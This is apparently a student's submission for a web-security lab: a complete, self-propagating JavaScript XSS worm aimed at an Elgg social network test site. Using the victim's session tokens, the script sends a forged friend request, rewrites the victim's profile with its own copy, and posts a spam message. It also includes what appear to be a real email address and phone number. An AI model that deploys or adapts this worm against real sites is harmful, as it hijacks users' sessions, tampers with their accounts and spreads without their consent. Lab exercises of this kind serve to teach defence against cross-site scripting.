<script type="text/javascript" id="worm">
	window.onload = function () {
	
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	

	var guid = "&guid=" + elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var name = "&name="+elgg.session.user.name;

	var desc = "&description=Samy has got you!" + wormCode + "&accesslevel[description]=1";
	var sdesc ="&briefdescription=1605089"+"&accesslevel[briefdescription]=1";
	var loc = "&location=Dhaka"+ "&accesslevel[location]=1";
	var interest = "&interests=Dance"+"&accesslevel[interests]=1";
	var skill = "&skills=Web Development"+"&accesslevel[skills]=1";
	var email ="&contactemail=elizaan199834@gmail.com"+"&accesslevel[contactemail]=1";
	var phone ="&phone=96836"+ "&accesslevel[phone]=1";
	var mob = "&mobile=01915980030"+ "&accesslevel[mobile]=1";
	var web = "&website=https://moodle.cse.buet.ac.bd"+"&accesslevel[website]=1";
	var twitter ="&twitter=@elixir1234"+ "&accesslevel[twitter]=1";
	
	var body = "&body=&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy";

	
	var sendurl= "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token; 
	if(elgg.session.user.guid!= elgg.page_owner.guid){
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();

	} 

	var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
	var content = token + ts + name + desc + sdesc+ loc +interest+ skill+ email+ phone + mob + web+ twitter+ guid;
		
	if(elgg.session.user.guid != elgg.page_owner.guid)
	{
		var Ajax = null;
		Ajax = new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}

	var sendurl="http://www.xsslabelgg.com/action/thewire/add";
	var content = token + ts + body;
		
		
	if(elgg.session.user.guid != elgg.page_owner.guid)
	{
		var Ajax = null;
		Ajax = new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}

	/* I have added the code done in the above three tasks. I have used a DOM API format to copy
JSCODE (worm) given by respected teachers. Then the copied js code has been named after
wormCode and I have concatenated it with the description field of the person who clicks the
infected profile(S). Thus the wormCode gets copied to the ones who click onto the infected
profile(S). And it propagates in this way */
	

	
}
</script>
